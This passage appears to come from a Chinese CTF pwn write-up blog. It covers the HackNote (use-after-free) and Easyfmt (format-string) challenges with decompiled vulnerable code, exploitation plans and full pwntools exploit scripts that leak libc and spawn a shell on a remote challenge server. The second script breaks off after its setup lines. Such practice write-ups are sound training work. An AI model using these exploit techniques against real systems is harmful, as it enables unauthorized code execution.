    sh <span class="token operator">=</span> lib_base <span class="token operator">+</span> one_gadget<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>

    li<span class="token punctuation">(</span><span class="token string">'lib_base:'</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>lib_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'OG addr:'</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> str<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#db()</span>
    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#a = 1</span>


<span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>
        io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_PRELOAD"</span> <span class="token punctuation">:</span> libFile<span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true">#io = exe.process()</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>remoteIp<span class="token punctuation">,</span> remotePort<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>

    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token triple-quoted-string string">'''
    pwn@Ubuntu:~/share$ one_gadget libc-2.29.so
    0xe237f execve("/bin/sh", rcx, [rbp-0x70])
    constraints:
    [rcx] == NULL || rcx == NULL
    [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

    0xe2383 execve("/bin/sh", rcx, rdx)
    constraints:
    [rcx] == NULL || rcx == NULL
    [rdx] == NULL || rdx == NULL

    0xe2386 execve("/bin/sh", rsi, rdx)
    constraints:
    [rsi] == NULL || rsi == NULL
    [rdx] == NULL || rdx == NULL

    0x106ef8 execve("/bin/sh", rsp+0x70, environ)
    constraints:
    [rsp+0x70] == NULL
'''</span></code></pre>
<h1 id="HackNote"><a href="#HackNote" class="headerlink" title="HackNote"></a>HackNote</h1><h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p>World of Attack &amp; Defense</p>
<h2 id="难度"><a href="#难度" class="headerlink" title="难度"></a>难度</h2><p>4 / 10</p>
<h2 id="保护-1"><a href="#保护-1" class="headerlink" title="保护"></a>保护</h2><pre><code>   Arch:     i386-32-little
   RELRO:    Partial RELRO
   Stack:    Canary found
   NX:       NX enabled
   PIE:      No PIE (0x8048000)</code></pre>
<h2 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h2><p>相对比较简单的堆利用题目, 保护机制比较少,涉及知识点也比较少…</p>
<h2 id="vul-1"><a href="#vul-1" class="headerlink" title="vul"></a>vul</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">rm</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>

  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> dword_804A04C <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//释放后没有让指针数组清空</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token comment" spellcheck="true">// not set null</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>


<span class="token comment" spellcheck="true">//打印函数</span>
<span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">puts_0</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>

  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> dword_804A04C <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>
     <span class="token comment" spellcheck="true">//vul 可以在堆中修改实现控制eip</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__cdecl <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//若没释放会调用 addputs函数</span>
  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> __cdecl <span class="token function">addputs</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>堆的基本利用</p>
<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>使用UAF漏洞实现和在堆中调用指针函数漏洞来实现获取libc基址,获取system地址,再次使用UAF修改该指针打印调用system获得shell</p>
<h2 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h2><h3 id="获取libc基址"><a href="#获取libc基址" class="headerlink" title="获取libc基址"></a>获取libc基址</h3><pre class=" language-python"><code class="language-python">    ad<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">)</span>
    rm<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    rm<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    dump_addr <span class="token operator">=</span> <span class="token number">0x0804862B</span>
    ad<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>dump_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>exe<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    dp<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'puts_addr: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>
    sys_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span></code></pre>
<h3 id="getshell-1"><a href="#getshell-1" class="headerlink" title="getshell"></a>getshell</h3><p>通过修改函数指针为system获得shell</p>
<pre class=" language-python"><code class="language-python">    <span class="token comment" spellcheck="true"># get shell</span>
    rm<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'; sh'</span><span class="token punctuation">)</span>
    dp<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre>
<h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>

<span class="token comment" spellcheck="true"># Author: I0gan</span>
<span class="token comment" spellcheck="true"># Team  : D0g3</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher

context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
<span class="token comment" spellcheck="true">#context.terminal = ['konsole', '-x', 'bash', 'c']</span>
<span class="token comment" spellcheck="true">#context.terminal = 'konsole'</span>

<span class="token comment" spellcheck="true">#context(arch = 'i386', os = 'linux', log_level='debug')</span>
<span class="token comment" spellcheck="true">#context(arch = 'amd64', os = 'linux', log_level='debug')</span>

exeFile  <span class="token operator">=</span> <span class="token string">"hacknote"</span>
libFile  <span class="token operator">=</span> <span class="token string">""</span>

remoteIp <span class="token operator">=</span> <span class="token string">"111.198.29.45"</span>
remotePort <span class="token operator">=</span> <span class="token number">32693</span>

LOCAL <span class="token operator">=</span> <span class="token number">0</span>
LIB   <span class="token operator">=</span> <span class="token number">0</span>

r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
pd32  <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> p32<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#python3 not surport str + bytes</span>
pd64  <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> p64<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
db    <span class="token operator">=</span> <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Func-----------------------------</span>
<span class="token keyword">def</span> <span class="token function">ad</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sa<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">'Note size :'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">'Content :'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">rm</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sa<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">dp</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sa<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    

<span class="token keyword">def</span> <span class="token function">q</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sa<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true">#li(rl())</span>
    ad<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">)</span>
    rm<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    rm<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    dump_addr <span class="token operator">=</span> <span class="token number">0x0804862B</span>
    ad<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>dump_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>exe<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    dp<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'puts_addr: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>
    sys_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># get shell</span>
    rm<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'; sh'</span><span class="token punctuation">)</span>
    dp<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIB<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_PRELOAD"</span> <span class="token punctuation">:</span> libFile<span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>remoteIp<span class="token punctuation">,</span> remotePort<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIB<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>

    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h1 id="Easyfmt"><a href="#Easyfmt" class="headerlink" title="Easyfmt"></a>Easyfmt</h1><h2 id="来源-1"><a href="#来源-1" class="headerlink" title="来源"></a>来源</h2><p>攻防世界</p>
<h2 id="vul-2"><a href="#vul-2" class="headerlink" title="vul"></a>vul</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-110h]</span>
  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+118h] [rbp-8h]</span>

  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"welcome to haerbin~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">CheckIn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"slogan: "</span><span class="token punctuation">,</span> <span class="token number">9uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//fmt vul</span>
  <span class="token punctuation">}</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"bye~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                      <span class="token comment" spellcheck="true">// modify this</span>
<span class="token punctuation">}</span></code></pre>
<h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>这是一个有概率的题,需要多打几次, 概率绕过第一个后, 通过fmt漏洞修改exit的got表实现循环利用,然后泄漏__libc_start_main获取libc基址, 获取system地址后, 然后再partial write修改printf的got为system地址</p>
<h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>

<span class="token comment" spellcheck="true"># Author: I0gan</span>
<span class="token comment" spellcheck="true"># Team  : D0g3</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher

<span class="token comment" spellcheck="true">#context.log_level='debug'</span>
<span class="token comment" spellcheck="true">#context.terminal = ['konsole', '-x', 'bash', 'c']</span>
<span class="token comment" spellcheck="true">#context.terminal = 'konsole'</span>
<span class="token comment" spellcheck="true">#context(arch = 'i386', os = 'linux', log_level='debug')</span>
context<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

exeFile  <span class="token operator">=</span> <span class="token string">"easyfmt"</span>
libFile  <span class="token operator">=</span> <span class="token string">""</span>

remoteIp <span class="token operator">=</span> <span class="token string">"111.198.29.45"</span>
remotePort <span class="token operator">=</span> <span class="token number">53453</span>

LOCAL <span class="token operator">=</span> <span class="token number">0</span>
LIB   <span class="token operator">=</span> <span class="token number">0</span>
